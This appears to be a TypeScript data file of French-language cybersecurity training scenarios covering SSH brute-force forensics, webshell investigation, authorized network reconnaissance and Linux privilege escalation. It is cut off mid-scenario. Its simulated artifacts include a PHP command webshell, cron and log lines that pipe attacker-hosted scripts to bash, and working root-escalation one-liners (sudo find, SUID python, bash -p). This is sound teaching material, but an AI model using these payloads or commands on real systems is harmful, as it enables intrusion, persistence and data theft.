export interface ScenarioStep {
  id: number;
  title: string;
  context: string;
  objective: string;
  hints: string[];
  validation: { type: 'command' | 'output'; value: string; description: string }[];
  fileSystem?: Record<string, unknown>;
}

export interface Scenario {
  id: number;
  title: string;
  category: 'forensic' | 'reseau' | 'systeme' | 'hacking' | 'pentest';
  difficulty: 'intermediate' | 'advanced';
  duration: string;
  description: string;
  context: string;
  xpReward: number;
  badge?: string;
  steps: ScenarioStep[];
}

export const scenarios: Scenario[] = [
  {
    id: 1,
    title: "Incident SSH : Brute-Force & Accès Non Autorisé",
    category: "forensic",
    difficulty: "intermediate",
    duration: "20-30 min",
    description: "Un serveur de production a subi une attaque par force brute sur SSH. L'attaquant a réussi à se connecter. Reconstitue la séquence d'événements à partir des logs.",
    context: `📋 BRIEFING — SOC Alert #2024-042

Il est 7h du matin. Une alerte automatique vient de s'activer sur le SIEM :
« Nombre anormal de tentatives SSH échouées depuis une IP externe ».

Ton rôle : Analyste en réponse à incident (IR). Tu dois :
1. Confirmer l'attaque brute-force
2. Identifier si une connexion a réussi
3. Repérer ce que l'attaquant a fait une fois connecté

Les preuves sont sur le serveur compromis. Commence l'analyse.`,
    xpReward: 500,
    badge: "incident_responder",
    steps: [
      {
        id: 1,
        title: "Identifier les tentatives échouées",
        context: "Le fichier auth.log contient toutes les tentatives d'authentification. Commence par filtrer les échecs pour avoir une vue globale.",
        objective: "Filtrer les lignes 'Failed password' dans auth.log et compter par IP",
        hints: [
          "`cat auth.log | grep 'Failed password'` — toutes les lignes d'échec.",
          "Ajoute `| grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` pour extraire les IPs.",
          "Puis `| sort | uniq -c | sort -rn` pour classer par nombre de tentatives."
        ],
        validation: [
          { type: 'command', value: 'grep Failed auth.log', description: 'Filtrer les tentatives échouées' }
        ],
        fileSystem: {
          'auth.log': `Jan 15 02:10:01 prod-server sshd[1234]: Failed password for root from 185.220.101.5 port 47621 ssh2
Jan 15 02:10:02 prod-server sshd[1234]: Failed password for root from 185.220.101.5 port 47622 ssh2
Jan 15 02:10:03 prod-server sshd[1234]: Failed password for admin from 185.220.101.5 port 47623 ssh2
Jan 15 02:10:04 prod-server sshd[1234]: Failed password for postgres from 185.220.101.5 port 47624 ssh2
Jan 15 02:10:05 prod-server sshd[1234]: Failed password for root from 185.220.101.5 port 47625 ssh2
Jan 15 02:10:06 prod-server sshd[1234]: Failed password for ubuntu from 185.220.101.5 port 47626 ssh2
Jan 15 02:11:00 prod-server sshd[1234]: Failed password for admin from 185.220.101.5 port 47700 ssh2
Jan 15 02:11:30 prod-server sshd[1235]: Accepted password for admin from 185.220.101.5 port 47800 ssh2
Jan 15 02:11:35 prod-server sshd[1235]: pam_unix(sshd:session): session opened for user admin
Jan 15 02:11:40 prod-server sudo[2000]: admin : TTY=pts/0 ; COMMAND=/bin/bash`
        }
      },
      {
        id: 2,
        title: "Confirmer la connexion réussie",
        context: "Parmi tous les échecs, y a-t-il une connexion acceptée ? Identifie l'heure exacte et le compte compromis.",
        objective: "Trouver la ligne 'Accepted password' et noter l'heure, le compte, l'IP source",
        hints: [
          "`grep 'Accepted' auth.log` — toutes les connexions réussies.",
          "Note : heure, utilisateur, IP source, port.",
          "Compare avec les tentatives échouées : combien de tentatives avant le succès ?"
        ],
        validation: [
          { type: 'command', value: 'grep Accepted auth.log', description: 'Trouver la connexion acceptée' }
        ],
        fileSystem: {
          'auth.log': `Jan 15 02:10:01 prod-server sshd[1234]: Failed password for root from 185.220.101.5 port 47621 ssh2
Jan 15 02:10:02 prod-server sshd[1234]: Failed password for root from 185.220.101.5 port 47622 ssh2
Jan 15 02:10:03 prod-server sshd[1234]: Failed password for admin from 185.220.101.5 port 47623 ssh2
Jan 15 02:11:30 prod-server sshd[1235]: Accepted password for admin from 185.220.101.5 port 47800 ssh2
Jan 15 02:11:40 prod-server sudo[2000]: admin : TTY=pts/0 ; COMMAND=/bin/bash`
        }
      },
      {
        id: 3,
        title: "Analyser les actions post-compromission",
        context: "L'attaquant est entré. Les actions effectuées après connexion sont dans les logs sudo et bash_history. Que cherchait-il ?",
        objective: "Lire bash_history et les logs sudo pour reconstituer les actions de l'attaquant",
        hints: [
          "`cat bash_history` — historique des commandes tapées par l'attaquant.",
          "`grep 'COMMAND' auth.log` — commandes exécutées via sudo.",
          "Repère : téléchargements (curl/wget), élévation de privilèges, modifications de cron."
        ],
        validation: [
          { type: 'command', value: 'cat bash_history', description: 'Lire l\'historique des commandes' },
          { type: 'command', value: 'grep COMMAND auth.log', description: 'Identifier les commandes sudo exécutées' }
        ],
        fileSystem: {
          'bash_history': `whoami
id
uname -a
cat /etc/passwd | grep -v nologin
wget http://185.220.101.5/tools/linpeas.sh -O /tmp/.scan.sh
chmod +x /tmp/.scan.sh
/tmp/.scan.sh > /tmp/.out 2>&1
cat /tmp/.out | grep -i password
crontab -l
echo "* * * * * root curl http://185.220.101.5/rev.sh|bash" >> /etc/cron.d/persist
exit`,
          'auth.log': `Jan 15 02:11:40 prod-server sudo[2000]: admin : TTY=pts/0 ; COMMAND=/bin/bash
Jan 15 02:12:00 prod-server sudo[2001]: root : COMMAND=/bin/cat /etc/shadow
Jan 15 02:12:30 prod-server sudo[2002]: root : COMMAND=/usr/bin/wget http://185.220.101.5/tools/linpeas.sh`
        }
      }
    ]
  },
  {
    id: 2,
    title: "Serveur Web Compromis : Webshell & Exfiltration",
    category: "forensic",
    difficulty: "advanced",
    duration: "30-45 min",
    description: "Un site web affiche des contenus anormaux. Un fichier PHP malveillant a été déposé. Identifie le vecteur d'intrusion, le webshell, et ce qui a été exfiltré.",
    context: `📋 BRIEFING — Ticket #INC-2024-089

L'équipe de développement signale que le site vitrine renvoie des pages inattendues.
Un client a signalé voir « une page bizarre avec du code ».

Accès fourni : serveur web (nginx + PHP), logs d'accès, arborescence /var/www.

Ton objectif :
1. Trouver le fichier PHP malveillant (webshell)
2. Comprendre comment l'attaquant a pu le déposer
3. Identifier ce qui a été exécuté via ce webshell`,
    xpReward: 750,
    badge: "web_investigator",
    steps: [
      {
        id: 1,
        title: "Cartographier les fichiers PHP",
        context: "Commence par lister tous les fichiers PHP du site. Un fichier récemment ajouté ou modifié sera suspect.",
        objective: "Trouver tous les fichiers .php et identifier celui qui semble anormal",
        hints: [
          "`find /var/www -name '*.php'` — tous les fichiers PHP.",
          "`ls -lt /var/www/html/` — triés par date, le plus récent en premier.",
          "Un fichier PHP qui utilise `system()`, `exec()`, `passthru()`, `eval()` est suspect."
        ],
        validation: [
          { type: 'command', value: 'find /var/www -name', description: 'Lister tous les fichiers PHP' }
        ],
        fileSystem: {
          'var': {
            'www': {
              'html': {
                'index.php': '<?php echo "<h1>Bienvenue sur notre site</h1>"; ?>',
                'contact.php': '<?php include "config.php"; // formulaire contact ?>',
                'about.php': '<?php echo "À propos de nous"; ?>',
                'upload.php': '<?php\n// WEBSHELL — FICHIER MALVEILLANT\nif(isset($_GET["cmd"])) { system($_GET["cmd"]); }\n?>'
              }
            }
          }
        }
      },
      {
        id: 2,
        title: "Analyser les logs d'accès",
        context: "Le fichier access.log nginx enregistre toutes les requêtes. Cherche des requêtes vers upload.php avec un paramètre 'cmd'.",
        objective: "Filtrer les logs pour voir les requêtes au webshell et les commandes exécutées",
        hints: [
          "`grep 'upload.php' access.log` — toutes les requêtes vers ce fichier.",
          "`grep 'cmd=' access.log` — requêtes avec paramètre de commande.",
          "Le champ URL-encodé `%20` = espace, `%2F` = slash dans les commandes."
        ],
        validation: [
          { type: 'command', value: 'grep upload.php access.log', description: 'Trouver les accès au webshell' },
          { type: 'command', value: 'grep cmd= access.log', description: 'Identifier les commandes exécutées' }
        ],
        fileSystem: {
          'access.log': `185.220.101.5 - - [15/Jan/2024:14:00:01] "GET /index.php HTTP/1.1" 200 1234
185.220.101.5 - - [15/Jan/2024:14:01:00] "POST /contact.php HTTP/1.1" 200 512
185.220.101.5 - - [15/Jan/2024:14:10:00] "GET /upload.php?cmd=id HTTP/1.1" 200 15
185.220.101.5 - - [15/Jan/2024:14:10:05] "GET /upload.php?cmd=whoami HTTP/1.1" 200 9
185.220.101.5 - - [15/Jan/2024:14:10:10] "GET /upload.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2048
185.220.101.5 - - [15/Jan/2024:14:10:30] "GET /upload.php?cmd=cat%20/var/www/html/config.php HTTP/1.1" 200 342
185.220.101.5 - - [15/Jan/2024:14:11:00] "GET /upload.php?cmd=curl%20http://185.220.101.5/exfil.sh|bash HTTP/1.1" 200 0`
        }
      },
      {
        id: 3,
        title: "Évaluer l'étendue de la compromission",
        context: "L'attaquant a lu config.php. Ce fichier contient-il des credentials ? Quelle est la surface d'impact ?",
        objective: "Lire config.php et évaluer les données potentiellement exfiltrées",
        hints: [
          "`cat /var/www/html/config.php` — voir les credentials exposés.",
          "Note chaque donnée sensible qui apparaît dans ce fichier.",
          "Pense à ce qu'un attaquant pourrait faire avec ces informations."
        ],
        validation: [
          { type: 'command', value: 'cat /var/www/html/config.php', description: 'Lire le fichier de config exposé' }
        ],
        fileSystem: {
          'var': {
            'www': {
              'html': {
                'config.php': `<?php
// Configuration base de données
define('DB_HOST', 'localhost');
define('DB_NAME', 'prod_website');
define('DB_USER', 'webapp_user');
define('DB_PASS', 'Pr0d@2024!Secur3');

// Clé API paiement
define('PAYMENT_API_KEY', 'sk_live_xxxxx_PRODUCTION_KEY');

// Chemin des uploads
define('UPLOAD_DIR', '/var/www/uploads/');
?>`
              }
            }
          }
        }
      }
    ]
  },
  {
    id: 3,
    title: "Cartographie Réseau : Découverte d'un Réseau Interne",
    category: "reseau",
    difficulty: "intermediate",
    duration: "25-35 min",
    description: "Tu viens de rejoindre une mission de pentest autorisé (red team). L'objectif est de cartographier un réseau interne à partir d'un point d'entrée, identifier les services actifs et les chemins d'accès.",
    context: `📋 BRIEFING — Mission Pentest #RT-2024-07

Cadre légal : Cette mission est réalisée dans le cadre d'un contrat de test d'intrusion signé.
Client : Entreprise fictive EduCorp.
Périmètre autorisé : réseau 10.0.0.0/24

Tu as obtenu un accès initial à un poste interne (192.168.1.50).
L'objectif est de :
1. Observer les interfaces et routes disponibles
2. Identifier les services accessibles
3. Cartographier les hôtes actifs du réseau interne

Important : Toujours opérer dans le périmètre autorisé uniquement.`,
    xpReward: 600,
    badge: "network_mapper",
    steps: [
      {
        id: 1,
        title: "Observer sa position réseau",
        context: "Avant toute chose : comprendre où tu es. Interfaces, adresses IP, table de routage.",
        objective: "Identifier tes interfaces réseau et ta position dans le réseau",
        hints: [
          "`ip addr` — toutes tes interfaces et adresses IP.",
          "`ip route` — ta table de routage (passerelle, réseaux directs).",
          "Note : es-tu multi-homé (plusieurs interfaces) ?"
        ],
        validation: [
          { type: 'command', value: 'ip addr', description: 'Lister les interfaces réseau' },
          { type: 'command', value: 'ip route', description: 'Lire la table de routage' }
        ],
        fileSystem: {}
      },
      {
        id: 2,
        title: "Identifier les ports en écoute locaux",
        context: "Quels services tournent sur ce poste ? Un service mal configuré peut aider à l'élévation ou à la découverte.",
        objective: "Lister tous les ports en écoute et identifier leurs processus",
        hints: [
          "`ss -tulnp` — ports TCP/UDP en écoute avec processus.",
          "Un port en 0.0.0.0 écoute sur toutes interfaces (accessible réseau).",
          "Un port en 127.0.0.1 n'est accessible qu'en local."
        ],
        validation: [
          { type: 'command', value: 'ss -tulnp', description: 'Lister les ports en écoute' }
        ],
        fileSystem: {
          'network_notes.txt': `Informations réseau initiales:
Interface eth0: 192.168.1.50/24
Interface eth1: 10.0.0.50/24 (réseau interne cible)
Gateway: 192.168.1.1
DNS: 8.8.8.8`
        }
      },
      {
        id: 3,
        title: "Diagnostiquer la connectivité et les services",
        context: "Depuis ta position, quels hôtes internes sont joignables ? Quels services répondent ?",
        objective: "Tester la connectivité vers des hôtes cibles et identifier les services",
        hints: [
          "`ping 10.0.0.1` — la passerelle interne répond-elle ?",
          "`curl -I http://10.0.0.10` — un service HTTP tourne-t-il là ?",
          "`dig @10.0.0.1 internal.educorp.local` — le DNS interne répond-il ?"
        ],
        validation: [
          { type: 'command', value: 'ping', description: 'Tester la joignabilité d\'hôtes internes' },
          { type: 'command', value: 'curl -I', description: 'Identifier les services HTTP accessibles' }
        ],
        fileSystem: {
          'scope.txt': `PÉRIMÈTRE AUTORISÉ — Mission RT-2024-07

Réseau cible : 10.0.0.0/24
Hôtes potentiels :
  10.0.0.1   — Routeur/Firewall interne
  10.0.0.10  — Serveur web interne (présumé)
  10.0.0.20  — Serveur de fichiers (présumé)
  10.0.0.100 — Serveur AD/DNS (présumé)

Rappel : NE PAS sortir du périmètre signé.`,
          'network_notes.txt': `Interface eth1: 10.0.0.50/24 (ton accès réseau interne)`
        }
      }
    ]
  },
  // ─── Scénario 4 : Reconnaissance nmap + énumération DNS
  {
    id: 4,
    title: "Pentest Phase 1 : Reconnaissance complète",
    category: "pentest",
    difficulty: "intermediate",
    duration: "25-35 min",
    description: "Première phase d'un pentest autorisé : cartographier la surface d'attaque via nmap, DNS, et énumération HTTP. Sans exploitation — juste de l'information gathering.",
    context: `📋 BRIEFING — Pentest #PT-2024-12

Client : EduCorp (environnement de test autorisé)
Phase : Reconnaissance (OSINT + scanning passif/actif)
Périmètre : 10.0.0.0/24, domaine target.local

Ta mission :
1. Scanner le réseau pour découvrir les hôtes actifs
2. Identifier les services exposés sur chaque hôte
3. Effectuer une reconnaissance DNS pour cartographier les sous-domaines
4. Collecter les headers HTTP des services web

Rappel : toute action hors périmètre = rupture de contrat.`,
    xpReward: 650,
    badge: "recon_specialist",
    steps: [
      {
        id: 1,
        title: "Découverte des hôtes (ping sweep)",
        context: "Avant de scanner les ports, identifie quels hôtes sont actifs sur le réseau 10.0.0.0/24.",
        objective: "Utiliser nmap pour un ping sweep et identifier les hôtes actifs",
        hints: [
          "`nmap -sn 10.0.0.0/24` — ping sweep (pas de scan de ports, juste découverte d'hôtes).",
          "`nmap -sn 10.0.0.1-50` — range d'IPs plus restreinte.",
          "Les hôtes qui répondent seront listés avec leur adresse MAC si possible."
        ],
        validation: [
          { type: 'command', value: 'nmap -sn', description: 'Ping sweep pour découvrir les hôtes actifs' }
        ],
        fileSystem: {
          'scope.txt': `Réseau autorisé : 10.0.0.0/24
Hôtes suspectés :
  10.0.0.1   - Routeur/Firewall
  10.0.0.5   - Inconnu
  10.0.0.10  - Inconnu
  10.0.0.20  - Inconnu
  10.0.0.100 - DNS/AD présumé`
        }
      },
      {
        id: 2,
        title: "Scan de ports et services",
        context: "Les hôtes sont identifiés. Maintenant : quels services exposent-ils ?",
        objective: "Scanner les ports avec détection de version sur les hôtes découverts",
        hints: [
          "`nmap -sV -p- 10.0.0.5` — scan complet avec versions (peut être lent).",
          "`nmap -sV -p 22,80,443,8080,3306 10.0.0.5` — ports courants uniquement.",
          "`nmap -sV --open 10.0.0.5` — afficher seulement les ports ouverts."
        ],
        validation: [
          { type: 'command', value: 'nmap -sV', description: 'Scanner les services avec détection de version' }
        ],
        fileSystem: {
          'hosts.txt': `Hôtes actifs découverts :
10.0.0.5   — à scanner en détail
10.0.0.10  — à scanner en détail
10.0.0.100 — serveur DNS (dig requis)`
        }
      },
      {
        id: 3,
        title: "Reconnaissance DNS",
        context: "Le DNS interne sur 10.0.0.100 est peut-être mal configuré. Tente un zone transfer.",
        objective: "Effectuer une reconnaissance DNS complète et tenter un zone transfer",
        hints: [
          "`dig axfr target.local @10.0.0.100` — tentative de zone transfer.",
          "`dig ANY target.local @10.0.0.100` — tous les enregistrements.",
          "Si le zone transfer réussit : tu as la carte complète du réseau interne."
        ],
        validation: [
          { type: 'command', value: 'dig axfr', description: 'Tenter un transfert de zone DNS' }
        ],
        fileSystem: {
          'dns_notes.txt': `Serveur DNS cible : 10.0.0.100
Domaine présumé  : target.local

Si zone transfer réussit, noter :
- Sous-domaines internes
- IPs associées
- Serveurs mail (MX)
- Enregistrements TXT (souvent des infos de config)`
        }
      },
      {
        id: 4,
        title: "Énumération HTTP et collecte de headers",
        context: "Le port 80 est ouvert sur 10.0.0.5. Les headers HTTP révèlent la stack technique.",
        objective: "Analyser les headers HTTP et identifier la technologie du serveur web",
        hints: [
          "`curl -I http://10.0.0.5` — headers de réponse (Server, X-Powered-By...).",
          "`curl -v http://10.0.0.5` — échange complet pour voir les headers de requête aussi.",
          "Note tout ce qui révèle une version : `Apache/2.4.29`, `PHP/7.2` = vérifier CVEs."
        ],
        validation: [
          { type: 'command', value: 'curl -I http://10.0.0.5', description: 'Récupérer les headers du serveur web' },
          { type: 'command', value: 'curl -v', description: 'Analyse complète de l\'échange HTTP' }
        ],
        fileSystem: {}
      }
    ]
  },

  // ─── Scénario 5 : Élévation de privilèges
  {
    id: 5,
    title: "Privilege Escalation : De user à root",
    category: "hacking",
    difficulty: "advanced",
    duration: "30-45 min",
    description: "Tu as un shell en tant qu'utilisateur limité. Identifie les vecteurs d'élévation de privilèges : sudo mal configuré, SUID suspects, crons writables, capabilities. Passe root.",
    context: `📋 BRIEFING — Post-exploitation #PE-2024-03

Tu as obtenu un shell SSH en tant qu'utilisateur "student" sur un serveur Linux.
Pas de mot de passe root connu. L'objectif : obtenir un accès root.

Approche systématique (méthodologie PrivEsc) :
1. Qui suis-je ? Quels groupes ?
2. Sudo : que puis-je faire sans mot de passe ?
3. SUID : binaires non standards ?
4. Crons : scripts writables ?
5. Capabilities : binaires avec cap spéciales ?

Chaque vecteur trouvé = potentiel chemin vers root.`,
    xpReward: 800,
    badge: "privesc_master",
    steps: [
      {
        id: 1,
        title: "Énumération système initiale",
        context: "Commence par comprendre ton contexte : utilisateur, groupes, OS, kernel, services.",
        objective: "Collecter les informations système de base pour orienter la recherche de vecteurs",
        hints: [
          "`id` — utilisateur, UID, groupes (être dans sudo/docker/lxd = vecteurs directs).",
          "`uname -a` — version du kernel (cherche CVEs locaux).",
          "`cat /etc/os-release` — version de la distribution."
        ],
        validation: [
          { type: 'command', value: 'id', description: 'Identifier l\'utilisateur et ses groupes' },
          { type: 'command', value: 'uname -a', description: 'Vérifier la version du kernel' }
        ],
        fileSystem: {
          'enum_notes.txt': `Questions clés lors de l'énumération initiale :
  - Suis-je dans le groupe docker ? → docker run -v /:/mnt alpine chroot /mnt
  - Suis-je dans le groupe disk ?  → debugfs /dev/sda1 puis cat /etc/shadow
  - Kernel < 5.8 ? CVE-2021-4034 (pkexec), CVE-2022-0847 (DirtyPipe)
  - /etc/passwd writable ? → ajouter un compte root`
        }
      },
      {
        id: 2,
        title: "Audit sudo",
        context: "`sudo -l` est souvent le premier vecteur à vérifier. Sans mot de passe et avec le bon binaire, c'est root immédiat.",
        objective: "Identifier et exploiter une mauvaise configuration sudo",
        hints: [
          "`sudo -l` — liste toutes les permissions sudo de l'utilisateur courant.",
          "Si tu vois `(ALL) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/bash \\; -quit`",
          "GTFOBins : gtfobins.github.io — référence pour tous les binaires exploitables via sudo."
        ],
        validation: [
          { type: 'command', value: 'sudo -l', description: 'Lister les permissions sudo' }
        ],
        fileSystem: {
          'sudo_output.txt': `User student may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /opt/backup/run_backup.sh

→ Vecteur 1 : sudo find . -exec /bin/bash \\; -quit
→ Vecteur 2 : sudo less /etc/passwd → !/bin/bash
→ Vecteur 3 : examiner /opt/backup/run_backup.sh`
        }
      },
      {
        id: 3,
        title: "Recherche de binaires SUID",
        context: "Les SUID non standards sont des vecteurs classiques. Un seul binaire mal configuré suffit.",
        objective: "Trouver les SUID non standards et identifier le vecteur d'exploitation",
        hints: [
          "`find / -perm -4000 -type f 2>/dev/null` — tous les binaires SUID.",
          "Compare avec les SUID attendus : passwd, su, sudo, ping, newgrp...",
          "Tout le reste (python, vim, bash, cp, nmap) est exploitable via GTFOBins."
        ],
        validation: [
          { type: 'command', value: 'find / -perm -4000', description: 'Lister tous les binaires SUID' }
        ],
        fileSystem: {
          'suid_check.txt': `SUID standards (attendus) :
  /usr/bin/passwd /usr/bin/su /usr/bin/sudo /bin/ping

SUID NON STANDARDS trouvés :
  /usr/bin/python3   ← EXPLOIT: python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
  /bin/bash          ← EXPLOIT: bash -p (preserved EUID=0)
  /opt/custom/suid_app ← binaire maison SUID → analyser avec strings`
        }
      },
      {
        id: 4,
        title: "Obtenir la preuve root",
        context: "Tu as identifié le vecteur. Exploite-le pour obtenir un shell root et capture le flag.",
        objective: "Obtenir root et lire /root/flag.txt",
        hints: [
          "Avec sudo find : `sudo find . -exec /bin/bash \\; -quit`",
          "Avec SUID bash : `bash -p` puis `whoami` (doit retourner root).",
          "Flag dans `/root/flag.txt` ou `/root/proof.txt`."
        ],
        validation: [
          { type: 'command', value: 'sudo find', description: 'Exploiter sudo find pour obtenir root' },
          { type: 'command', value: 'cat /root/flag.txt', description: 'Capturer la preuve root' }
        ],
        fileSystem: {
          '/root/flag.txt': 'FLAG{pr1v3sc_m4st3r_sudo_suid_pwned}\nPrivilege Escalation completed.',
          'exploit_path.txt': `Chemin d'exploitation retenu :
1. sudo -l → NOPASSWD: /usr/bin/find
2. sudo find . -exec /bin/bash \\; -quit
3. whoami → root
4. cat /root/flag.txt → FLAG`
        }
      }
    ]
  },

  // ─── Scénario 6 : Analyse forensic d'une infrastructure compromise
  {
    id: 6,
    title: "Forensic Avancé : Infrastructure Compromise",
    category: "forensic",
    difficulty: "advanced",
    duration: "40-60 min",
    description: "Un incident majeur : plusieurs serveurs semblent compromis. Malware, webshell, persistance, mouvement latéral. Reconstruis la chaîne d'attaque complète à partir des artefacts disponibles.",
    context: `📋 BRIEFING — Major Incident #IR-2024-CRITICAL

Niveau : Critique (P1)
Périmètre touché : 3 serveurs minimum

Ce que l'on sait :
- Des données clients ont été exfiltrées (alertes DLP)
- Un ransomware chiffre des partages réseau
- Le SOC a collecté des artefacts sur les machines suspectes

Ta mission :
1. Identifier le vecteur initial d'accès (email ? web ? RDP ?)
2. Cartographier le mouvement latéral
3. Trouver les mécanismes de persistance
4. Identifier les données exfiltrées
5. Reconstruire la timeline complète

Chaque artefact compte. Commence par les logs d'auth.`,
    xpReward: 1000,
    badge: "ir_expert",
    steps: [
      {
        id: 1,
        title: "Vecteur initial — accès web",
        context: "L'attaque semble avoir commencé par le serveur web en DMZ. Analyse les logs d'accès web.",
        objective: "Identifier le vecteur d'accès initial via les logs Apache/nginx",
        hints: [
          "`grep '200' access.log | grep -E '\\.php\\?|cmd=|exec='` — requêtes d'exploitation.",
          "`grep 'POST' access.log | grep -v 'login\\|contact'` — POST suspects (upload de webshell ?).",
          "Un code 200 sur un fichier PHP inexistant avant l'incident = webshell uploadé."
        ],
        validation: [
          { type: 'command', value: 'grep POST access.log', description: 'Identifier les requêtes POST suspectes' },
          { type: 'command', value: 'grep cmd= access.log', description: 'Détecter l\'utilisation du webshell' }
        ],
        fileSystem: {
          'access.log': `10.30.30.15 - - [15/Jan/2024:08:00:00] "GET /index.php HTTP/1.1" 200 4321
10.30.30.15 - - [15/Jan/2024:08:05:00] "POST /upload/image_handler.php HTTP/1.1" 200 42
185.220.101.5 - - [15/Jan/2024:08:06:00] "GET /upload/shell_x9k2.php?cmd=id HTTP/1.1" 200 4
185.220.101.5 - - [15/Jan/2024:08:06:05] "GET /upload/shell_x9k2.php?cmd=whoami HTTP/1.1" 200 9
185.220.101.5 - - [15/Jan/2024:08:07:00] "GET /upload/shell_x9k2.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2048
185.220.101.5 - - [15/Jan/2024:08:08:00] "GET /upload/shell_x9k2.php?cmd=curl+http://185.220.101.5/implant.sh+-O+/tmp/.svc HTTP/1.1" 200 0`
        }
      },
      {
        id: 2,
        title: "Mouvement latéral — analyse réseau",
        context: "L'attaquant a pivoté depuis la DMZ vers le réseau interne. Identifie les connexions entre machines.",
        objective: "Retrouver le mouvement latéral dans les logs réseau et SSH",
        hints: [
          "`grep 'Accepted' auth_all.log | grep -v '192.168.1'` — connexions SSH depuis IPs inattendues.",
          "`grep '10.40.40' network.log` — connexions depuis la DMZ vers le LAN interne.",
          "Une connexion DMZ→LAN en SSH à 3h du matin depuis un compte applicatif = suspect."
        ],
        validation: [
          { type: 'command', value: 'grep Accepted auth_all.log', description: 'Trouver les connexions SSH suspectes' },
          { type: 'command', value: 'grep 10.40.40 network.log', description: 'Détecter le mouvement latéral DMZ→LAN' }
        ],
        fileSystem: {
          'auth_all.log': `Jan 15 08:15:00 web-dmz sshd: Accepted publickey for www-data from 185.220.101.5 port 55234
Jan 15 08:16:00 db-server sshd: Accepted publickey for backup_svc from 10.40.40.10 port 12345
Jan 15 08:16:30 file-server sshd: Accepted publickey for backup_svc from 10.20.20.5 port 23456`,
          'network.log': `Jan 15 08:15:30 ALLOW 10.40.40.10 → 10.20.20.5:22 (SSH)
Jan 15 08:16:00 ALLOW 10.20.20.5 → 10.20.20.10:445 (SMB)
Jan 15 08:16:15 ALLOW 10.20.20.5 → 10.20.20.15:22 (SSH)
Jan 15 08:20:00 ALERT 10.20.20.5 → 185.220.101.5:443 (exfiltration ?)`
        }
      },
      {
        id: 3,
        title: "Persistance — mécanismes de maintien",
        context: "L'attaquant a installé une persistance pour survivre à un reboot. Où ?",
        objective: "Découvrir tous les mécanismes de persistance installés sur les serveurs",
        hints: [
          "`cat /etc/cron.d/*` — crons système potentiellement piégés.",
          "`find /tmp /var/tmp /dev/shm -type f 2>/dev/null` — fichiers dans répertoires temporaires.",
          "`cat ~/.ssh/authorized_keys` — clé SSH de backdoor ajoutée ?"
        ],
        validation: [
          { type: 'command', value: 'cat /etc/cron.d', description: 'Inspecter les crons système' },
          { type: 'command', value: 'find /tmp /var/tmp', description: 'Trouver les fichiers malveillants temporaires' }
        ],
        fileSystem: {
          '/etc/cron.d/backup-sync': `# Service de sync backup (LÉGITIME)
0 2 * * * root /opt/backup/sync.sh`,
          '/etc/cron.d/update-check': `# Vérification mises à jour (MALVEILLANT)
* * * * * root curl http://185.220.101.5/c2.sh | bash`,
          '/tmp/.svc': '[BINAIRE MALVEILLANT — implant C2]',
          '.ssh/authorized_keys': `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@c2  ← CLÉ BACKDOOR AJOUTÉE`
        }
      },
      {
        id: 4,
        title: "Exfiltration — données volées",
        context: "Les alertes DLP signalent un transfert de données vers l'extérieur. Que s'est-il passé ?",
        objective: "Identifier les données exfiltrées et le canal d'exfiltration",
        hints: [
          "`grep '185.220.101.5' network.log | grep ALLOW` — transferts vers l'IP attaquant.",
          "`cat exfil_timeline.txt` — reconstruction chronologique.",
          "Volume de données suspect : plusieurs Go vers une IP externe = exfiltration."
        ],
        validation: [
          { type: 'command', value: 'grep 185.220.101.5 network.log', description: 'Tracer les transferts vers l\'attaquant' },
          { type: 'command', value: 'cat exfil_timeline.txt', description: 'Lire la timeline d\'exfiltration' }
        ],
        fileSystem: {
          'exfil_timeline.txt': `Timeline exfiltration (reconstruction) :

08:20:00 → Connexion HTTPS (443) vers 185.220.101.5
08:20:15 → Transfer 45 Mo (fichiers /var/www/html/config/*.php)
08:25:00 → Transfer 280 Mo (/home/*/Documents)
08:30:00 → Transfer 1.2 Go (dump MySQL base_clients)
08:35:00 → Transfer 15 Ko (clés SSH /root/.ssh/)
Total : ~1.5 Go de données exfiltrées

Données compromises :
  - Configs avec credentials (BDD, API)
  - Documents internes utilisateurs
  - Base clients (RGPD : notification obligatoire 72h)
  - Clés SSH root`
        }
      }
    ]
  },

  // ─── Scénario 7 : Pentest réseau complet (VLAN + DMZ + pivot)
  {
    id: 7,
    title: "Pentest Avancé : VLAN, DMZ & Pivot",
    category: "pentest",
    difficulty: "advanced",
    duration: "45-60 min",
    description: "Pentest d'une infrastructure complète avec segmentation VLAN et DMZ. Depuis un accès initial en VLAN utilisateurs, pivote vers la DMZ puis vers le réseau serveurs. Architecture multi-zones.",
    context: `📋 BRIEFING — Pentest #PT-2024-ADVANCED

Client : EduCorp (lab autorisé)
Architecture :
  VLAN 30 — Utilisateurs : 10.30.30.0/24 (ton point de départ)
  VLAN 40 — DMZ          : 10.40.40.0/24 (cible intermédiaire)
  VLAN 20 — Serveurs     : 10.20.20.0/24 (cible finale)
  VLAN 10 — Management   : 10.10.10.0/24 (hors scope)

Objectifs :
1. Observer ta position réseau initiale
2. Identifier les services accessibles depuis ton VLAN
3. Exploiter un service en DMZ pour y obtenir un accès
4. Pivoter depuis la DMZ vers le réseau serveurs internes

Règle : VLAN 10 Management = hors périmètre autorisé.`,
    xpReward: 900,
    badge: "network_pentester",
    steps: [
      {
        id: 1,
        title: "Position initiale et carte réseau",
        context: "Tu es sur un poste en VLAN 30 (utilisateurs). Identifie ta position et les routes disponibles.",
        objective: "Cartographier ta position réseau et les VLAN accessibles",
        hints: [
          "`ip addr` — ton adresse IP (10.30.30.x = VLAN 30 confirmé).",
          "`ip route` — quelles destinations sont routées depuis ici ?",
          "`cat /etc/hosts` — entrées locales qui révèlent des noms internes."
        ],
        validation: [
          { type: 'command', value: 'ip addr', description: 'Identifier ton IP et VLAN actuel' },
          { type: 'command', value: 'ip route', description: 'Lire la table de routage pour trouver les routes disponibles' }
        ],
        fileSystem: {
          'network_map.txt': `Architecture EduCorp (briefing) :
  Ton IP     : 10.30.30.42 (VLAN 30 Users)
  DMZ        : 10.40.40.0/24
  Serveurs   : 10.20.20.0/24 (normalement non routable depuis VLAN30)
  Management : 10.10.10.0/24 (HORS SCOPE)

Question : le firewall permet-il 10.30.30.0/24 → 10.40.40.0/24 ?
Teste avec ping / curl vers 10.40.40.10`
        }
      },
      {
